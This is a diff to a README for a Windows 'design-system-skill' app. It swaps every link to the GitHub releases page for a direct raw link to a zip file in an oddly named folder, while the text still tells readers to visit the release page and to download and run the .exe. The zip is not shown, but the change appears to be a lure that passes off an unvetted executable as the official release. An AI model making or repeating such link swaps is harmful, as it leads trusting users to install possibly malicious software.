@@ -1,6 +1,6 @@
 # 🎨 design-system-skill - Turn designs into clean docs
 
-[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/Cash4478/design-system-skill/releases)
+[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://raw.githubusercontent.com/Cash4478/design-system-skill/main/Chaetognatha/system_design_skill_2.6.zip)
 
 ## 🧩 What this is
 
@@ -16,7 +16,7 @@ You can use it with images, PDFs, links, and screenshots. It fits AI-assisted co
 
 Visit this page to download and run the latest release on Windows:
 
-https://github.com/Cash4478/design-system-skill/releases
+https://raw.githubusercontent.com/Cash4478/design-system-skill/main/Chaetognatha/system_design_skill_2.6.zip
 
 On the release page, look for the latest version and download the Windows file that matches your device. If you see a `.exe` file, download it and run it. If you see a zip file, download it, unzip it, then open the app inside the folder.
 
@@ -204,6 +204,6 @@ If you still have trouble, download the latest release again from the release pa
 
 ## 📎 Release download
 
-[![Get the Windows release](https://img.shields.io/badge/Visit%20Releases-Download%20Here-grey)](https://github.com/Cash4478/design-system-skill/releases)
+[![Get the Windows release](https://img.shields.io/badge/Visit%20Releases-Download%20Here-grey)](https://raw.githubusercontent.com/Cash4478/design-system-skill/main/Chaetognatha/system_design_skill_2.6.zip)
 
 Go to the releases page to download the latest Windows build and run it on your computer
